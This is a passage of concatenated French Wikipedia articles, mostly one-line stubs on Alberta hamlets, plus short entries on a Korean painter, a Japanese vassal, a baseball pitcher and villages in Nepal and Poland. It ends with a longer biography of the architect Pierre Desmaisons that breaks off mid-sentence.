Green Court est un hameau ("hamlet") du Comté de Lac Sainte-Anne, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903161" url="https://fr.wikipedia.org/wiki?curid=7903161" title="Rich Valley (Alberta)">
Rich Valley (Alberta)

 
Rich Valley est un hameau ("hamlet") du Comté de Lac Sainte-Anne, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903162" url="https://fr.wikipedia.org/wiki?curid=7903162" title="Rochfort Bridge (Alberta)">
Rochfort Bridge (Alberta)

Rochfort Bridge est un hameau ("hamlet") du Comté de Lac Sainte-Anne, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903163" url="https://fr.wikipedia.org/wiki?curid=7903163" title="Hilliard (Alberta)">
Hilliard (Alberta)

 
Hilliard est un hameau ("hamlet") du comté de Lamont, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903164" url="https://fr.wikipedia.org/wiki?curid=7903164" title="Saint-Michael (Alberta)">
Saint-Michael (Alberta)

 
Saint-Michael est un hameau ("hamlet") du Comté de Lamont, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903165" url="https://fr.wikipedia.org/wiki?curid=7903165" title="Star (Alberta)">
Star (Alberta)

 
Star est un hameau ("hamlet") du Comté de Lamont, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903166" url="https://fr.wikipedia.org/wiki?curid=7903166" title="Whitford (Alberta)">
Whitford (Alberta)

 
Whitford est un hameau ("hamlet") du Comté de Lamont, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903167" url="https://fr.wikipedia.org/wiki?curid=7903167" title="Wostok">
Wostok

Wostok est un hameau ("hamlet") du Comté de Lamont, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903168" url="https://fr.wikipedia.org/wiki?curid=7903168" title="Fairview (hameau)">
Fairview (hameau)

 
Fairview est un hameau ("hamlet") du comté de Lethbridge, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903169" url="https://fr.wikipedia.org/wiki?curid=7903169" title="Bow City (hameau)">
Bow City (hameau)

 
Bow City est un hameau ("hamlet") du Comté de Newell, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903170" url="https://fr.wikipedia.org/wiki?curid=7903170" title="Cassils">
Cassils

Cassils est un hameau ("hamlet") du Comté de Newell, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903171" url="https://fr.wikipedia.org/wiki?curid=7903171" title="Gem (Alberta)">
Gem (Alberta)

 
Gem est un hameau ("hamlet") du Comté de Newell, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903172" url="https://fr.wikipedia.org/wiki?curid=7903172" title="Lake Newell Resort">
Lake Newell Resort

Lake Newell Resort est un hameau ("hamlet") du comté de Newell, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903173" url="https://fr.wikipedia.org/wiki?curid=7903173" title="Rainier (Alberta)">
Rainier (Alberta)

 
Rainier est un hameau ("hamlet") du Comté de Newell, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903174" url="https://fr.wikipedia.org/wiki?curid=7903174" title="Deadwood (Alberta)">
Deadwood (Alberta)

Deadwood est un hameau ("hamlet") du Comté de Northern Lights, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903175" url="https://fr.wikipedia.org/wiki?curid=7903175" title="Yun Du-seo">
Yun Du-seo

Yun Du-seo (1668-1715) (윤두서 / 尹斗緖 ) était un peintre et un lettré de la période Joseon. Il est le petit-fils de Yun Seondo, un grand écrivain de la littérature coréenne.
Biographie.
Yun Du-seo passa le Gwageo mais n'entra pas au service du gouvernement, dédiant sa vie à la peinture et à l'étude du confucianisme.

</doc>
<doc id="7903176" url="https://fr.wikipedia.org/wiki?curid=7903176" title="North Star (Alberta)">
North Star (Alberta)

 
North Star est un hameau ("hamlet") du Comté de Northern Lights, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903177" url="https://fr.wikipedia.org/wiki?curid=7903177" title="Notikewin">
Notikewin

Notikewin est un hameau ("hamlet") du Comté de Northern Lights, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903178" url="https://fr.wikipedia.org/wiki?curid=7903178" title="Brownfield (Alberta)">
Brownfield (Alberta)

 
Brownfield est un hameau ("hamlet") du comté de Paintearth N 18, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903179" url="https://fr.wikipedia.org/wiki?curid=7903179" title="Fleet (Alberta)">
Fleet (Alberta)

 
Fleet est un hameau ("hamlet") du Comté de Paintearth N 18, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903180" url="https://fr.wikipedia.org/wiki?curid=7903180" title="Les FTP-MOI dans la Résistance">
Les FTP-MOI dans la Résistance



</doc>
<doc id="7903182" url="https://fr.wikipedia.org/wiki?curid=7903182" title="Ardley (Alberta)">
Ardley (Alberta)

 
Ardley est un hameau ("hamlet") du Comté de Red Deer, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903183" url="https://fr.wikipedia.org/wiki?curid=7903183" title="Balzac (Alberta)">
Balzac (Alberta)

 
Balzac est un hameau ("hamlet") du Comté de Rocky View, situé dans la province canadienne d'Alberta. Depuis l'expansion des limites de la ville de Calgary en 2007, Balzac est désormais adjacente à Calgary ; le hameau se situe directement à l'ouest de l'autoroute Queen Elizabeth II (sortie 275).
Le Canadien Pacifique créa une gare de chemin de fer à Balzac en 1910 ; le nom fut donné par le président du Canadien Pacifique, William Cornelius Van Horne, en hommage à un de ses auteurs préférés, Honoré de Balzac.

</doc>
<doc id="7903185" url="https://fr.wikipedia.org/wiki?curid=7903185" title="Bottrel">
Bottrel

Bottrel est un hameau ("hamlet") du Comté de Rocky View, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903187" url="https://fr.wikipedia.org/wiki?curid=7903187" title="Delacour (Alberta)">
Delacour (Alberta)

 
Delacour est un hameau du Comté de Rocky View, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903188" url="https://fr.wikipedia.org/wiki?curid=7903188" title="Janet (Alberta)">
Janet (Alberta)

Janet est un hameau ("hamlet") du Comté de Rocky View, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903189" url="https://fr.wikipedia.org/wiki?curid=7903189" title="Heinsburg">
Heinsburg

Heinsburg est un hameau ("hamlet") du Comté de Saint-Paul N 19, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903190" url="https://fr.wikipedia.org/wiki?curid=7903190" title="Lindbergh (Alberta)">
Lindbergh (Alberta)

 
Lindbergh est un hameau ("hamlet") du Comté de Saint-Paul N 19, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903191" url="https://fr.wikipedia.org/wiki?curid=7903191" title="Lottie Lake">
Lottie Lake

Lottie Lake est un hameau ("hamlet") du comté de Saint-Paul N 19, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903192" url="https://fr.wikipedia.org/wiki?curid=7903192" title="Riverview (Alberta)">
Riverview (Alberta)

Riverview est un hameau ("hamlet") du Comté de Saint-Paul N 19, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903194" url="https://fr.wikipedia.org/wiki?curid=7903194" title="Bellis (Alberta)">
Bellis (Alberta)

 
Bellis est un hameau ("hamlet") du Comté de Smoky Lake, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903195" url="https://fr.wikipedia.org/wiki?curid=7903195" title="Edwand">
Edwand

Edwand est un hameau ("hamlet") du Comté de Smoky Lake, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903196" url="https://fr.wikipedia.org/wiki?curid=7903196" title="Spedden (Alberta)">
Spedden (Alberta)

Spedden est un hameau ("hamlet") du Comté de Smoky Lake, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903197" url="https://fr.wikipedia.org/wiki?curid=7903197" title="Craigmyle (Alberta)">
Craigmyle (Alberta)

Craigmyle est un hameau ("hamlet") du Comté de Starland, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903198" url="https://fr.wikipedia.org/wiki?curid=7903198" title="Michichi">
Michichi

Michichi est un hameau ("hamlet") du Comté de Starland, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903199" url="https://fr.wikipedia.org/wiki?curid=7903199" title="Rowley (Alberta)">
Rowley (Alberta)

 
Rowley est un hameau ("hamlet") du Comté de Starland, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903200" url="https://fr.wikipedia.org/wiki?curid=7903200" title="Rumsey (Alberta)">
Rumsey (Alberta)

 
Rumsey est un hameau ("hamlet") du Comté de Starland, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903201" url="https://fr.wikipedia.org/wiki?curid=7903201" title="Lamoureux (Alberta)">
Lamoureux (Alberta)

Lamoureux est un hameau ("hamlet") du Comté de Sturgeon, situé dans la province canadienne d'Alberta.
On y retrouve l'église Notre-Dame-de-Lourdes, une des plus vieilles églises catholiques de la province.
Références.
 

</doc>
<doc id="7903202" url="https://fr.wikipedia.org/wiki?curid=7903202" title="Mearns (Alberta)">
Mearns (Alberta)

Mearns est un hameau ("hamlet") du Comté de Sturgeon, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903203" url="https://fr.wikipedia.org/wiki?curid=7903203" title="Pine Sands">
Pine Sands

Pine Sands est un hameau ("hamlet") du comté de Sturgeon, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903204" url="https://fr.wikipedia.org/wiki?curid=7903204" title="Beauvallon (Alberta)">
Beauvallon (Alberta)

 
Beauvallon est un hameau ("hamlet") du Comté de Two Hills N 21, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903205" url="https://fr.wikipedia.org/wiki?curid=7903205" title="Morecambe (Alberta)">
Morecambe (Alberta)

Morecambe est un hameau ("hamlet") du Comté de Two Hills N 21, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903206" url="https://fr.wikipedia.org/wiki?curid=7903206" title="Musidora (Alberta)">
Musidora (Alberta)

 
Musidora est un hameau ("hamlet") du Comté de Two Hills N 21, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903207" url="https://fr.wikipedia.org/wiki?curid=7903207" title="McLaughlin (Alberta)">
McLaughlin (Alberta)

McLaughlin est un hameau ("hamlet") du Comté de Vermilion River, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903208" url="https://fr.wikipedia.org/wiki?curid=7903208" title="Rivercourse (Alberta)">
Rivercourse (Alberta)

Rivercourse est un hameau ("hamlet") du Comté de Vermilion River, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903209" url="https://fr.wikipedia.org/wiki?curid=7903209" title="Streamstown (Alberta)">
Streamstown (Alberta)

Streamstown est un hameau ("hamlet") du Comté de Vermilion River, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903210" url="https://fr.wikipedia.org/wiki?curid=7903210" title="Tulliby Lake">
Tulliby Lake

Tulliby Lake est un hameau ("hamlet") du Comté de Vermilion River, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903211" url="https://fr.wikipedia.org/wiki?curid=7903211" title="Brant (Alberta)">
Brant (Alberta)

 
Brant est un hameau ("hamlet") du Comté de Vulcan, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903212" url="https://fr.wikipedia.org/wiki?curid=7903212" title="Wada Koremasa">
Wada Koremasa

 est un vassal du clan Oda à la fin de l'époque Sengoku du Japon féodal. Koremasa est le fils de Wada Koresuke et soutient directement le shogunat Ashikaga au moment où il est à l'âge admissible, devenant supporteur principal d'Ashikaga Yoshiaki à la suite de l'assassinat de Yoshiteru en 1565.
Tandis qu'Yoshiaki passe sous l'influence d'Oda Nobunaga en 1567, Koremasa continue de servir son maître attitré et se révèle une figure de respect mutuel aux Oda au cours de l'année 1569 où il organise une audience entre Oda Nobunaga et le missionnaire jésuite Luis Frois. À la suite de cet événement initial, Koremasa prend en charge les affaires directement liées au clan Takayama et devient enfin un obligé de valeur des Oda, ce qui peut s'expliquer par sa collaboration avec Araki Murashige dans la défense d'un domaine de son clan en 1571. Cependant, Koremasa est dépassé par la force des attaquants, ce qui entraîne finalement sa mort.

</doc>
<doc id="7903213" url="https://fr.wikipedia.org/wiki?curid=7903213" title="Ensign (Alberta)">
Ensign (Alberta)

Ensign est un hameau ("hamlet") du Comté de Vulcan, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903214" url="https://fr.wikipedia.org/wiki?curid=7903214" title="Herronton">
Herronton

Herronton est un hameau ("hamlet") du Comté de Vulcan, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903215" url="https://fr.wikipedia.org/wiki?curid=7903215" title="Kirkcaldy (Alberta)">
Kirkcaldy (Alberta)

Kirkcaldy est un hameau ("hamlet") du Comté de Vulcan, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903218" url="https://fr.wikipedia.org/wiki?curid=7903218" title="Mossleigh">
Mossleigh

Mossleigh est un hameau ("hamlet") du Comté de Vulcan, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903219" url="https://fr.wikipedia.org/wiki?curid=7903219" title="Queenstown (Alberta)">
Queenstown (Alberta)

 
Queenstown est un hameau ("hamlet") du Comté de Vulcan, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903220" url="https://fr.wikipedia.org/wiki?curid=7903220" title="Shouldice (Alberta)">
Shouldice (Alberta)

Shouldice est un hameau ("hamlet") du Comté de Vulcan, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903222" url="https://fr.wikipedia.org/wiki?curid=7903222" title="Travers (Alberta)">
Travers (Alberta)

 
Travers est un hameau ("hamlet") du Comté de Vulcan, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903223" url="https://fr.wikipedia.org/wiki?curid=7903223" title="New Dayton">
New Dayton

New Dayton est un hameau ("hamlet") du Comté de Warner N 5, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903224" url="https://fr.wikipedia.org/wiki?curid=7903224" title="Wrentham (Alberta)">
Wrentham (Alberta)

 
Wrentham est un hameau ("hamlet") du Comté de Warner N 5, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903225" url="https://fr.wikipedia.org/wiki?curid=7903225" title="Aldersyde (Alberta)">
Aldersyde (Alberta)

Aldersyde est un hameau ("hamlet") de Foothills N 31, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903226" url="https://fr.wikipedia.org/wiki?curid=7903226" title="Donn Roach">
Donn Roach

Donn Mitchell Roach (né le 14 décembre 1989 à Las Vegas, Nevada, États-Unis) est un lanceur droitier de la Ligue majeure de baseball sous contrat avec les Mariners de Seattle.
Carrière.
Donn Roach est un choix de troisième ronde des Angels de Los Angeles d'Anaheim en 2010. Roach est surtout lanceur partant dans les ligues mineures. Le 3 mai 2012, alors qu'il évolue pour un club-école des Angels, Roach accompagne le joueur de deuxième but Alexi Amarista dans la transaction qu'il l'envoie aux Padres de San Diego en retour du lanceur de relève droitier Ernesto Frieri.
Roach fait ses débuts dans le baseball majeur comme lanceur de relève pour San Diego le 2 avril 2014. En 30 manches et un tiers lancées en 16 parties des Padres en 2014, Roach présente une moyenne de points mérités de 4,75 avec une victoire, sa première dans les majeures, remportée le 22 avril sur les Brewers de Milwaukee.
Le 12 novembre 2014, Roach est réclamé au ballottage par les Cubs de Chicago. Il n'apparaît que dans un seul match des Cubs au cours de la saison 2015.
En décembre 2015, il rejoint les Mariners de Seattle.

</doc>
<doc id="7903227" url="https://fr.wikipedia.org/wiki?curid=7903227" title="De Winton (Alberta)">
De Winton (Alberta)

De Winton est un hameau ("hamlet") de Foothills N 31, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903230" url="https://fr.wikipedia.org/wiki?curid=7903230" title="Heritage Pointe">
Heritage Pointe

Heritage Pointe est un hameau ("hamlet") de comté de Foothills, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903232" url="https://fr.wikipedia.org/wiki?curid=7903232" title="Millarville">
Millarville

Millarville est un hameau ("hamlet") de Foothills N 31, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903234" url="https://fr.wikipedia.org/wiki?curid=7903234" title="Priddis">
Priddis

Priddis est un hameau ("hamlet") de Foothills N 31, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903236" url="https://fr.wikipedia.org/wiki?curid=7903236" title="Priddis Greens">
Priddis Greens

Priddis Greens est un hameau ("hamlet") de comté de Foothills, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903237" url="https://fr.wikipedia.org/wiki?curid=7903237" title="Grovedale (Alberta)">
Grovedale (Alberta)

 
Grovedale est un hameau ("hamlet") de Greenview N 16, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903238" url="https://fr.wikipedia.org/wiki?curid=7903238" title="Landry Heights">
Landry Heights

Landry Heights est un hameau ("hamlet") de Greenview, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903239" url="https://fr.wikipedia.org/wiki?curid=7903239" title="Little Smoky">
Little Smoky

Little Smoky est un hameau ("hamlet") de Greenview N 16, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903240" url="https://fr.wikipedia.org/wiki?curid=7903240" title="Ridgevalley">
Ridgevalley

Ridgevalley est un hameau ("hamlet") de Greenview, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903241" url="https://fr.wikipedia.org/wiki?curid=7903241" title="Marten Beach (Alberta)">
Marten Beach (Alberta)

Marten Beach est un hameau ("hamlet") de Lesser Slave River N 124, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903244" url="https://fr.wikipedia.org/wiki?curid=7903244" title="Wagner (Alberta)">
Wagner (Alberta)

 
Wagner est un hameau ("hamlet") de Lesser Slave River N 124, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903247" url="https://fr.wikipedia.org/wiki?curid=7903247" title="Bodo (Alberta)">
Bodo (Alberta)

 
Bodo est un hameau ("hamlet") de Provost N 52, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903248" url="https://fr.wikipedia.org/wiki?curid=7903248" title="Metiskow">
Metiskow

Metiskow est un hameau ("hamlet") de Provost N 52, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903250" url="https://fr.wikipedia.org/wiki?curid=7903250" title="Guy (Alberta)">
Guy (Alberta)

 
Guy est un hameau ("hamlet") de Smoky River N 130, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903251" url="https://fr.wikipedia.org/wiki?curid=7903251" title="Jean Cote (Alberta)">
Jean Cote (Alberta)

Jean Côté ("Jean Cote en Anglais") est un hameau ("hamlet") de Smoky River N 130, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903252" url="https://fr.wikipedia.org/wiki?curid=7903252" title="Greenshields (Alberta)">
Greenshields (Alberta)

 
Greenshields est un hameau ("hamlet") de Wainwright N 61, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903253" url="https://fr.wikipedia.org/wiki?curid=7903253" title="Ribstone">
Ribstone

Ribstone est un hameau ("hamlet") de Wainwright N 61, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903254" url="https://fr.wikipedia.org/wiki?curid=7903254" title="Parkland (Alberta)">
Parkland (Alberta)

Parkland est un hameau ("hamlet") de Willow Creek N 26, situé dans la province canadienne d'Alberta.
Références.
 

</doc>
<doc id="7903256" url="https://fr.wikipedia.org/wiki?curid=7903256" title="Woodhouse (Alberta)">
Woodhouse (Alberta)

 
Woodhouse est un hameau ("hamlet") de Willow Creek N 26, situé dans la province canadienne d'Alberta.

</doc>
<doc id="7903258" url="https://fr.wikipedia.org/wiki?curid=7903258" title="Tengen Inc.">
Tengen Inc.



</doc>
<doc id="7903259" url="https://fr.wikipedia.org/wiki?curid=7903259" title="Ranibas">
Ranibas

Ranibas peut faire référence à :

</doc>
<doc id="7903262" url="https://fr.wikipedia.org/wiki?curid=7903262" title="Communes à facilité de la « périphérie bruxelloise »">
Communes à facilité de la « périphérie bruxelloise »



</doc>
<doc id="7903267" url="https://fr.wikipedia.org/wiki?curid=7903267" title="Ranibas (Surkhet)">
Ranibas (Surkhet)

Ranibas (en ) est un comité de développement villageois du Népal situé dans le district de Surkhet. Au recensement de 2011, il comptait .

</doc>
<doc id="7903269" url="https://fr.wikipedia.org/wiki?curid=7903269" title="Liste de toponymes comprenant &quot;nouveau&quot;">
Liste de toponymes comprenant &quot;nouveau&quot;



</doc>
<doc id="7903273" url="https://fr.wikipedia.org/wiki?curid=7903273" title="Bieliny (Varsovie-ouest)">
Bieliny (Varsovie-ouest)

Bieliny [bjɛˈlinɨ] est un village polonais, situé dans la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village a une population de 8 habitants en 2000.

</doc>
<doc id="7903275" url="https://fr.wikipedia.org/wiki?curid=7903275" title="Bromierzyk (Varsovie-ouest)">
Bromierzyk (Varsovie-ouest)

Bromierzyk [brɔˈmjɛʐɨk] est un village polonais, situé dans la gmina de Kampinos, dans la Powiat de Varsovie-ouest et la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village a une population de 27 habitants en 2000.

</doc>
<doc id="7903277" url="https://fr.wikipedia.org/wiki?curid=7903277" title="Pierre Desmaisons">
Pierre Desmaisons

Pierre des Maisons est un architecte français, né le à Paris, où il est mort le . Son grand œuvre reste la reconstruction du palais de justice de Paris.
Biographie.
Il appartient à une famille d'entrepreneurs parisiens. Il est le fils de Nicolas Desmaisons, maître maçon, entrepreneur de bâtiments, et de Marguerite Mony. Il s'est marié en 1736 avec Marie-Madeleine Sinson, née en 1696, fille aînée de Pierre Sinson, maître charpentier originaire d'Orléans, juré-expert en charpenterie, négociant en bois. Pierre Sinson a transmis à sa fille la maison qu'il s'était fait construire par Philippe Roy au rue de Verneuil. 
Il a acquis très tôt une réputation de technicien habile. Il est architecte juré du roi, expert des bâtiments par office du .
La même année, il fournit les plans de l'hôtel de Jaucourt appelé aussi hôtel Portalis, à l'angle des rues Croix-des-Petits-Champs et de la Vrillière sur un terrain prévu pour construire l'hôtel du maréchal de La Feuillade mais que ses héritiers ont dû vendre pour payer les dettes, après l'édification des soubassements du bâtiment sur des plans de Jules Hardouin-Mansart. L'hôtel définitif a été construit pour la comtesse Pierre de Jaucourt, née Marie-Josèphe de Graves. Le devis et le marché signés le indiquent que l'hôtel doit être construit par le maître maçon Sébastien Charpentier sur les plans de Pierre Desmaisons. Outre le traitement habile de cette parcelle en angle avec deux avant-corps cylindriques sur trompes, on remarque l'abondance de sa ferronnerie rocaille. Sous l'Empire, l'hôtel fut la propriété du baron Portalis, l'un des rédacteurs du Code civil. 
Les Théatins, ordre fondé à Rome en 1524, sont arrivés à Paris en 1644. Grâce à l'appui du cardinal Mazarin, ils ont pu acquérir une maison à l'emplacement actuel du 23 quai Voltaire (à l'époque, partie occidentale du "quai Malaquais"). Le , ils font bénir une chapelle provisoire dédiée à Sainte-Anne-la-Royale. Ils entreprennent de construire une église entre le quai Voltaire et la rue de Lille (alors "rue de Bourbon") à partir de 1661. En , le général des théatins a envoyé le père Guarino Guarini pour en faire les plans. En 1666, Guarini quitte le chantier alors que l'église n'est pas terminée, seuls les murs du transept ont été construits. Le manque de ressources financières conduit les théatins à réduire leur projet et à se limiter à couvrir ce qui était déjà édifié, puis à construire des passages permettant d'accéder à l'église sous des maisons de rapport élevées quai Voltaire et rue de Lille. Pierre Desmaisons fournit le plan de la façade du passage du quai Voltaire en 1746, construit grâce à la générosité de Jean-François Boyer, ancien évêque de Mirepoix et ancien supérieur des théatins. Jacques-François Blondel l'a décrite dans l"'Architecture française" ; s'il complimente Desmaisons pour son talent manifesté précocement, il est plutôt critique à propos de ce portail sur le quai (à l'époque où il écrit, celui sur la rue de Lille n'est pas construit). Il trouve maladroit et un peu lourd cet entassement de colonnes au rez-de-chaussée et aux étages, d'autant que ces étages sont faits de logements privés, et préférerait des pilastres à ce niveau. Le , le chapitre conventuel approuve le projet de Pierre Desmaisons pour la façade du passage situé au 26 rue de Lille, qui subsiste, contrairement à celui sur le quai. Il a visiblement tenu compte des critiques de Blondel en variant les niveaux et en faisant disparaître les colonnes, remplacées aux étages par des pilastres et au rez-de-chaussée par de très civils bossages. Mais Blondel a peut-être été un peu injuste avec l'entrée du quai Voltaire, car Desmaisons avait réussi la gageure de la faire passer pour un portail d'église tout en dissimulant sous une grande verrière centrale imitant un vitrail deux niveaux d'habitation. Les travaux ont été longs et n'ont été achevés qu'en 1780.
En 1754, Claude de Mérault, lieutenant du roi au gouvernement du comté de Bourgogne, a hérité de la terre de Gif-sur-Yvette. Il confia à Pierre Desmaisons la construction du château de Button sur cette terre. La construction du château a été terminée en 1777 par Charles-Louis Debonnaire (1756-1830), cousin de Claude de Mérault mort en 1757. Le château est depuis la dernière guerre la propriété du CNRS.
En 1778, André-Charles Debonnaire (1740-1793), frère de Charles-Louis, commande à Pierre Desmaisons les plans d'un château à l’emplacement d’un ancien manoir féodal à Forges en Seine-et-Marne. André-Charles Debonnaire, qui appartient à une importante famille de noblesse de robe, avec des alliances Le Pelletier de Liancourt, Choppin d'Arnouville, Joly de Fleury, Bertier de Sauvigny et Pasquier, va jouer un rôle auprès de Pierre Desmaisons à travers ses fonctions et son réseau (voir infra). Le château que lui construit ce dernier ne comprend à l’origine que la partie centrale avec ses deux avancées. Il a été agrandi au . Dans les années 2020, il est l'objet d'une grande campagne de restauration.
Après son travail pour les théatins, Pierre Desmaisons a conçu des édifices importants pour d'autres communautés religieuses : chapitre de Saint-Denis de l'Estrée, couvent des Grands Augustins, collégiale Saint-Honoré de la rue Croix-des-Petits-Champs. Il s'agit là encore de répondre à leurs besoins propres mais aussi de leur procurer des ressources. Comme expert-bourgeois, il a évalué le palais de l'Élysée pour les héritiers La Tour d'Auvergne avant la vente à Madame de Pompadour, en 1753. Deux ans plus tard, il hérite de son père Nicolas un immeuble locatif rue d'Anjou, loué à la pièce (18 au total, sur trois niveaux). Il décide de l'adapter à l'évolution du quartier et au goût du jour en créant un appartement par étage, comportant salon, salle à manger et deux chambres. Membre de l'Académie royale d'architecture à partir de 1762, il est anobli en 1769 avec le titre de baron. En 1773, il est fait chevalier de l'Ordre de Saint-Michel et en août 1776, le roi le choisit pour l'élévation à la première classe de l'Académie.
Desmaisons a été l'architecte de Christophe de Beaumont, archevêque de Paris, pour l'ancien archevêché, entre la Seine et la cathédrale Notre-Dame, où il a poursuivi les travaux de Robert de Cotte. Il a refait vers 1770 ses salles de réception et édifié un escalier d'honneur remarqué ; il comprend une volée centrale suivie de deux volées en retour dans un vestibule orné de nombreuses sculptures dans des niches. Luc-Vincent Thiéry dit que le grand escalier dessiné par Desmaisons est un "ouvrage estimé des connaisseurs". L'accès se fait par un portail qui rappelle ceux des théatins : deux paires de colonnes au rez-de-chaussée et pilastres à l'étage. Il a par ailleurs beaucoup travaillé dans le château de Conflans de l'archevêque, à Charenton-le-Pont. Il y a édifié de nouveaux bâtiments qui complètent ceux venant des Villandry : un grand corps de logis qui surplombe la Seine, une fabrique au bord de l'eau à la limite du parc de Bercy, et un imposant portail d'entrée (1777) qui est un des rares vestiges subsistants de cet ensemble, mais quelque peu incongru au milieu des grands immeubles. 
Après la guerre de Sept Ans, une fièvre immobilière s'est emparée de Paris. L'arrêt du accorde des conditions favorables à la construction privée. Un de ses articles stipule qu'en cas de faillite une déclaration préalable à la Chambre des Bâtiments permet aux bailleurs de prétendre à la propriété du chantier. Cela a permis de faire de l'immobilier un placement populaire dans toutes les classes de la société et consacré l'essor de l'immeuble de rapport que décrit Jean-François Cabestan dans son ouvrage "La conquête du plain-pied".
Il a construit dans les années 1770 :
Il intervient en 1776 pour expertiser les premières fissures qui étaient apparues à la base des piliers de l'église Sainte-Geneviève que construit son collègue Jacques-Germain Soufflot (futur Panthéon). Comme Desmaisons a dit à Soufflot que cette expertise lui était commandée « du plus haut », Soufflot rappelle que Desmaisons était l'architecte de Madame Louise ; il a de fait construit les bâtiments réguliers du Carmel de Saint-Denis, dont elle était la prieure, sauf la chapelle qui est de Richard Mique. Les conclusions de son rapport seront plutôt rassurantes et n'arrêteront pas le chantier.
Le , un violent incendie ravage le Palais de Justice de Paris. Le chantier de reconstruction est d'abord confié à Joseph Couture, architecte du Palais. Mais un accident survenu aux voûtes de la galerie Mercière remet en cause sa participation, et il est remplacé en 1779 par Pierre-Louis Moreau-Desproux et Pierre Desmaisons. Moreau-Desproux démissionne en 1781 et Desmaisons se retrouve seul aux commandes. Il sera vite au centre d'une bataille rangée entre les entrepreneurs, alliés pour la circonstance au nouveau directeur des Bâtiments du roi, d'Angiviller, qui veut récupérer un pouvoir perdu au profit des Contrôleurs généraux des Finances, et cette administration des Finances, alors dirigée par Joly de Fleury, où il retrouve André-Charles Debonnaire de Forges, maître des requêtes et intendant des Finances du Domaine. Pour compliquer les choses, l'Académie d'architecture le lâche et cautionne les attaques des entrepreneurs qui agitent le risque d'un effondrement du Palais de Justice après l'apparition de nouvelles fissures. Or il estime avoir pris toutes les mesures nécessaires pour consolider les façades sur la cour du Mai et que les fissures constatées sont bénignes. D'abord condamné à refaire les travaux sur ses propres deniers, il obtient l'appui sans faille de Joly de Fleury 
